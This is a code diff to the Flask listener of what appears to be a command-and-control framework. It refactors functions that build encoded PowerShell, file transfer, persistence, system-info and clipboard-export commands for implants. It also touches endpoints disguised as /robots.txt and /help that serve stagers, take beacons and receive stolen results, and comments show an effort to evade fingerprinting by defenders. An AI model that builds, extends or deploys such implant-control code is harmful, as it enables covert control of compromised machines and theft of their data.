@@ -22,54 +22,55 @@ def craft_sound_file(path):
     return audio
 
 
-def craft_powershell_native_command(args):
+def craft_powershell_native_command(args, command_id):
     a = base64.b64encode(args['args'].encode()).decode()
-    b = args['type']+a
+    b = args['type']+command_id + a
     return b
 
 
-def craft_file_upload(value_dict):
-    return str(value_dict['type'])
+def craft_file_upload(value_dict, command_id):
+    return str(value_dict['type'] + command_id)
 
 
-def craft_file_download(value_dict):
-    return str(value_dict['type'])
+def craft_file_download(value_dict, command_id):
+    return str(value_dict['type'] + command_id)
 
 
-def craft_enable_persistence(value_dict):
-    return str(value_dict['type'])
+def craft_enable_persistence(value_dict, command_id):
+    return str(value_dict['type'] + command_id)
 
 
-def craft_sys_info(value_dict):
-    return str(value_dict['type'])
+def craft_sys_info(value_dict, command_id):
+    return str(value_dict['type'] + command_id)
 
 
-def craft_export_clipboard(value_dict):
-    return str(value_dict['type'])
+def craft_export_clipboard(value_dict, command_id):
+    return str(value_dict['type'] + command_id)
 
 
-def craft_load_module(value_dict):
-    print(value_dict['args'])
+def craft_load_module(value_dict, command_id):
+    print(value_dict['args'] + command_id)
     try:
         with open(str(os.getcwd()+"/Storage/implant_resources/modules/"+value_dict['args']+".ps1"), 'r') as fileh:
             to_encode = "{}::{}".format(value_dict['args'], fileh.read())
-            load_module_string = "LM" + base64.b64encode(to_encode.encode()).decode()
+            load_module_string = "LM" + command_id + base64.b64encode(to_encode.encode()).decode()
             return load_module_string
     except Exception as e:
+
         # These exceptions should be added to a log file.
-        print("Load module failed")
+        print("Load module failed: {}".format(e))
         pass
     return str("==")
 
 
-def craft_invoke_module(value_dict):
+def craft_invoke_module(value_dict, command_id):
     a = base64.b64encode(value_dict['args'].encode()).decode()
-    b = value_dict['type'] + a
+    b = value_dict['type'] + command_id + a
     return b
 
 
-def craft_list_modules(value_dict):
-    return str(value_dict['type'])
+def craft_list_modules(value_dict, command_id):
+    return str(value_dict['type'] + command_id)
 
 
 #
@@ -102,7 +103,7 @@ def alter_headers(response):
 
 # -- TODO: extracted and added into a new stager specific listener(?)
 @app.route("/robots.txt", methods=['GET'])
-def Stager():
+def stager():
     # This endpoint is responsible for generating the implant based on stager callbacks
     implant_data = db.implant.Register_NewImplantFromStagerKey(request.values['user'])
     if implant_data:
@@ -117,34 +118,39 @@ def implant_beacon_endpoint():
     if 'X-Implant' not in request.headers:
         return "=="
     if request.method == "POST":
-        next_cmd, command_id = Imp.IssueCommand(request.headers['X-Implant'], app.config['listener_type'])
-        if next_cmd != None:
-            processed_return_val = preprocessing[next_cmd['type']](next_cmd)
-            print("Sending command to implant!\nCommand string: {}\ncommand_id: {}".format(processed_return_val, command_id))
+        next_cmd, command_id = Imp.issue_command(request.headers['X-Implant'], app.config['listener_type'])
+        if next_cmd is not None:
+            processed_return_val = preprocessing[next_cmd['type']](next_cmd, command_id)
+            print("Sending command to implant!\nCommand string: {}\ncommand_id: {}".format(
+                processed_return_val,
+                command_id))
             return processed_return_val
-    # Need to remove the use of == in beacons: this is too fingerprintable.
+    # Need to remove the use of == in beacons, this can be fingerprinted with ease.
     return "=="
 
 
 @app.route("/help", methods=['GET', 'POST'])
-def ImplantCommandResult():
+def implant_command_result():
     # -- X-Result is a placeholder header and should be changed to a more realistic value
     response_stream_data = request.stream.read()
     decoded_response_stream_data = response_stream_data.decode()
     if "X-Result" in request.headers:
-        decoded_response = base64.b64decode(decoded_response_stream_data+"==")
-        Imp.CommandResponse(request.headers['X-Result'], decoded_response, app.config['listener_type'])
+
+        command_id = decoded_response_stream_data[0:24]
+        encoded_command = decoded_response_stream_data[24:]
+        decoded_response = base64.b64decode(encoded_command+"==").decode()
+
+        Imp.command_response(request.headers['X-Result'], command_id, decoded_response, app.config['listener_type'])
     return "=="
 
 
 # This should be randomised to avoid blueteams fingerprinting the server by querying this endpoint.
 @app.route("/nlaksnfaobcaowb", methods=['GET', 'POST'])
-def ShutdownListener():
+def shutdown_listener():
     if request.remote_addr == "127.0.0.1":
         shutdown_hook = request.environ.get('werkzeug.server.shutdown')
         if shutdown_hook is not None:
             shutdown_hook()
-        # raise RuntimeError("Server going down")
 
 
 def shutdown():
